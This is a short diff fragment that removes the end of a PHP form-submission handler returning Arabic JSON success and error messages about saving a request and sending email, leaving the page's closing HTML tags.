-        'message' => 'تم إرسال الطلب وحفظه بنجاح، سيتم الرد قريباً على بريدك الإلكتروني.'
-    ]);
-} else {
-    http_response_code(500);
-    echo json_encode([
-        'success' => false,
-        'error' => 'تعذر إرسال البريد الإلكتروني، لكن تم حفظ بياناتك. سيتم مراجعة طلبك يدوياً.'
-    ]);
-}
-?>
--->
 </body>
 </html>
